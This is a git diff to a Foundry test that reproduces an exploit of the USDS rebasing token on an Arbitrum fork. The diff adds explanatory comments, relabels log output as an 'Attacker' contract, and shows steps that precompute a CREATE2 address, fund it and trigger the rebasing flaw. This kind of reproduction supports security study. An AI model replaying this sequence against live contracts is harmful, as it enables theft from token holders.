@@ -15,9 +15,12 @@ contract Exploit_Usds is TestHarness, TokenBalanceTracker {
 
     function setUp() external {
         cheat.createSelectFork("arbitrum", 57803396); 
+        
+        // As USDS is behind a proxy, Foundry does not 
+        // let us deal directly to it. 
+        // That's why we use `cheat.prank` to transfer
+        // 20e18 USDS to this address from the USDSWhale account
         // deal(address(usds), address(this), 20e18); // because USDS is behind a proxy, this fails on foundry.
-
-        factory = new ContractFactory();
         cheat.prank(usdsWhale);
         usds.transfer(address(this), 20e18);
         cheat.deal(address(this), 0);
@@ -38,16 +41,16 @@ contract Exploit_Usds is TestHarness, TokenBalanceTracker {
         updateBalanceTracker(precomputedAddr);
         console.log('Sending tokens to %s', precomputedAddr);
         usds.transfer(precomputedAddr, 11e18);
-        logBalancesWithLabel('\nToken Handler Contract (precompute)', precomputedAddr);
+        logBalancesWithLabel('\nAttacker Token Handler Contract (precompute)', precomputedAddr);
 
         console.log('===== 2. Deploy contract with Create2 =====');
         address deployedAddr = factory.deploy(address(this), bytes32(uint256(9122018)));
         require(deployedAddr == precomputedAddr, 'address mismatch');
-        logBalancesWithLabel('\nToken Handler Contract (deployed == precompute)', deployedAddr);
+        logBalancesWithLabel('\nAttacker Token Handler Contract (deployed == precompute)', deployedAddr);
 
         console.log('===== 3. Update rebasing calculation of USDS =====');
         AttackerContract(deployedAddr).transferERC20(address(usds), address(this), 1);
-        logBalancesWithLabel('\nToken Handler Contract (after update)', deployedAddr);
+        logBalancesWithLabel('\nAttacker Token Handler Contract (after update)', deployedAddr);
     }
 
 
